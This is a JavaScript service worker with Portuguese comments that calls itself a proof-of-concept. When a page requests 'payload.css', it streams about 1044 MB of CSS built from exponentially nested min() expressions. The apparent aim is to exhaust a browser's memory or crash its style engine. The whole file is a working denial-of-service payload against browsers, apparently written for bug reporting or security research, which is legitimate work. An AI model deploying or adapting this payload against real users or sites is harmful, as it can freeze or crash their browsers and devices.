// sw.js - Service Worker que gera 1044MB de CSS sob demanda
self.addEventListener('install', event => self.skipWaiting());
self.addEventListener('activate', event => event.waitUntil(self.clients.claim()));

self.addEventListener('fetch', event => {
  if (event.request.url.endsWith('payload.css')) {
    const stream = new ReadableStream({
      start(controller) {
        const enc = new TextEncoder();
        function push(str) { controller.enqueue(enc.encode(str)); }

        // Cria uma base pequena no JS (~393 KB) para evitar recursão profunda
        let baseString = '1px';
        for (let i = 1; i <= 16; i++) {
          baseString = 'min(' + baseString + ',' + baseString + ')';
        }

        // Função que transmite para a rede sem acumular na RAM
        function streamNode(currentDepth, targetDepth) {
          if (currentDepth === targetDepth) {
            push(baseString);
            return;
          }
          push('min(');
          streamNode(currentDepth + 1, targetDepth);
          push(',');
          streamNode(currentDepth + 1, targetDepth);
          push(')');
        }

        // Helpers para os blocos que você mapeou
        function pushC22() { streamNode(16, 22); }
        function pushC24() { streamNode(16, 24); }

        push('.t{width:');

        // Estrutura do Blob de 1044MB exata do seu PoC original
        push('min(');
          // left = o2_24 = 576MB
          push('min(');
            push('min('); pushC24(); push(','); pushC24(); push('),');
            push('min('); pushC24(); push(','); pushC24(); push(')');
          push('),');

          // right = 468MB
          push('min(');
            push('min('); pushC24(); push(','); pushC24(); push('),');
            push('min('); pushC24(); push(','); pushC22(); push(')');
          push(')');
        push(')}');

        controller.close();
      }
    });

    event.respondWith(new Response(stream, {
      headers: { 'Content-Type': 'text/css' }
    }));
  }
});